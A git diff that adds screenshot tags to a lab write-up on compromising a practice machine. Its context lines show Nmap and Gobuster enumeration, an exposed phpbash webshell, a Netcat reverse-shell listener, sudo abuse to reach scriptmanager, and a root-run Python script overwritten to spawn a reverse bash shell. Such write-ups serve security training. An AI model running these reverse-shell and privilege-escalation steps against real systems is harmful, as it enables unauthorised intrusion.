@@ -36,6 +36,10 @@ An initial Nmap scan was performed against the target system to identify open po
 nmap -sV -sC -T4 10.129.48.91
 ```
 
+
+<img src="images/nmap.png" width="600">
+
+
 The scan revealed an Apache web server running on port `80/tcp`:
 
 - `HTTP (80/tcp)` running `Apache httpd 2.4.18 (Ubuntu)`
@@ -55,11 +59,21 @@ Web directory enumeration was performed using Gobuster in order to discover hidd
 gobuster dir -u http://<TARGET-IP> -w /usr/share/wordlists/dirb/common.txt
 ```
 
+
+<img src="images/gobuster.png" width="600">
+
+
+
 During enumeration, an accessible directory named `/dev` was discovered.
 
 Inside this directory, a PHP-based webshell called `phpbash` was exposed:
 
 - `/dev/phpbash.php`
+
+
+<img src="images/dev.png" width="600">
+
+
 
 The presence of an accessible webshell represented a critical security misconfiguration, as it allowed remote command execution directly through the web application.
 
@@ -85,6 +99,9 @@ To obtain a more stable interactive shell, a Netcat listener was started on the 
 nc -lvnp 4444
 ```
 
+<img src="images/reverse-shell.png" width="600">
+
+
 A Python reverse shell was then executed through the webshell:
 
 ```bash
@@ -107,11 +124,16 @@ After obtaining an interactive shell as `www-data`, sudo permissions were enumer
 sudo -l
 ```
 
+<img src="images/sudo -l.png" width="600">
+
+
+
 The output revealed that the `www-data` user was allowed to execute commands as the `scriptmanager` user without requiring a password:
 
 ```text
 (scriptmanager : scriptmanager) NOPASSWD: ALL
 ```
+
 
 This misconfiguration allowed privilege escalation from `www-data` to `scriptmanager`.
 
@@ -122,6 +144,9 @@ A shell was spawned as the `scriptmanager` user using:
 ```bash
 sudo -u scriptmanager /bin/bash
 ```
+
+<img src="images/scriptmanager.png" width="600">
+
 
 After switching users, the current privileges were verified:
 
@@ -141,9 +166,18 @@ cd /scripts
 ls -la
 ```
 
+
+<img src="images/scripts.png" width="600">
+
+
 Inside the directory, a Python script named `test.py` was discovered:
 
 - `test.py`
+
+
+<img src="images/testpy.png" width="600">
+
+
 
 File permissions revealed that the `scriptmanager` user had write access to the script.
 
@@ -173,6 +207,11 @@ subprocess.call(["/bin/bash","-i"])
 EOF
 ```
 
+
+<img src="images/privesc.png" width="600">
+
+
+
 After a short period of time, the scheduled task executed the modified script as `root`, resulting in a reverse shell connection back to the attacking machine.
 
 ### 🔹 Root Shell
@@ -182,6 +221,9 @@ Once the reverse shell connected successfully, elevated privileges were verified
 ```bash
 whoami
 ```
+
+<img src="images/root.png" width="600">
+
 
 The shell was now running as:
 
